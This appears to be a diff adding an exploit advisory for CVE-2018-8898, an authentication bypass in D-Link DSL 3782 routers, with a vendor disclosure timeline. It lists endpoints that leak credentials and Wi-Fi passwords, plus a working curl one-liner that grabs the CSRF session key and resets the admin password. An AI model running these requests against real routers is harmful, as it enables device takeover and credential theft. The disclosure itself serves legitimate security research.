@@ -1,0 +1,51 @@
+# Exploit Title: D-Link DSL 3782 - Authentication Bypass
+# Vendor Homepage: https://eu.dlink.com
+# Version: A1_WI_20170303 || SWVer="V100R001B012" FWVer="3.10.0.24" FirmVer="TT_77616E6771696F6E67"
+# Category: Webapps
+# Exploit Author: Giulio Comi
+# CVE : CVE-2018-8898
+# Date: 20/05/2018
+
+# Description
+# The web panel of D-Link DSL 3782 version (A1_WI_20170303) does not release a token ID (e.g. a session cookie) that identifies the logged in administrator, but only relies # on a server-side timeout that lasts few minutes.
+# In addition, a server-side mitigation in place prompts for login credentials everytime the webroot is loaded, but does leave the application endpoints unprotected # and affected by this authentication bypass.
+
+# Therefore,  after a valid login of the administrator the web panel does not distinguish valid HTTP requests from the admin and the ones that come from other users.
+# This way, an attacker can script an automatic routine that perform unwanted actions such as arbitrary modifications to router and SSIDs passwords and configurations.
+
+# Some of the possible actions for retrieving important information
+# GET  http://192.168.1.1/romfile.cfg ---> retrieve the complete settings of the router (all credentials included)
+# GET http://192.168.1.1/cgi-bin/get/New_GUI/Settings_24.asp ---> retrieve the password for SSID of 2.4Ghz
+# GET http://192.168.1.1/cgi-bin/get/New_GUI/Settings_5.asp ---> retrieve the password for SSID of 5.0Ghz
+# GET http://192.168.1.1/cgi-bin/New_GUI/GuestZone.asp    ---> retrieve the password for Guest network, if present
+
+# For POST requests that makes changes to passwords, SSIDs name and configurations, a 'sessionKey' value is used by the web application to prevent Cross-site request forgery (CSRF) attacks.
+# However, this value can be retrieved with this Authentication Bypass issue with the following GET request:
+# 'GET http://192.168.1.1/cgi-bin/get/New_GUI/get_sessionKey.asp'
+
+# For example, the below POST request allows to change the Web Interface Administrator's password:
+curl --data "Password=[NEW_PASSWORD_SET_BY_THE_ATTACKER]" \
+--data "sessionKey=$(curl -sS http://192.168.1.1/cgi-bin/get/New_GUI/get_sessionKey.asp)" \
+http://192.168.1.1/cgi-bin/New_GUI/Set/Admin.asp
+
+# Some other possible actions for altering the configurations:
+# POST http://192.168.1.1/cgi-bin/New_GUI/WiFi_loding.asp ---> change passwords of the SSIDs
+# POST http://192.168.1.1/cgi-bin/New_GUI/Set/firmware_upgrade.asp ---> upgrade firmware
+# POST http://192.168.1.1/cgi-bin/New_GUI/Set/reboot_wait.asp ---> reboot router
+# POST /cgi-bin/New_GUI/Set/config_upgrade.asp  ---> upload a new configuration file ('romfile.cfg')
+
+# Note 1: Since the router misses a network segretation, a user that has access to the Guest network could also perform this attack.
+# Note 2: Web panels exposed to the Internet allows anonymous attacker to leverage this vulnerability and possibly takeover the router.
+# Note 3: Others forks of the firmware and software versions have not been tested.
+
+# Timeline
+# 26/03 Vendor contacted
+# 28/03 Vendor replied
+# 05/04 Vendor requested more information to track the vulnerable firmware version 'because the D-Link DSL 3782 have many forks'
+# 05/04 I have sent the detailed information of firmware and software version retrievable from:
+#       - the web panel graphic ('A1_WI_20170303')
+#       - the romfile.cfg ('SWVer="V100R001B012" FWVer="3.10.0.24" FirmVer="TT_77616E6771696F6E67"')
+# 20/04 requested an update, no response
+# 03/05 requested an update, no response
+# 07/05 requested an update, still no response from the security response team
+# 20/05 full disclosure
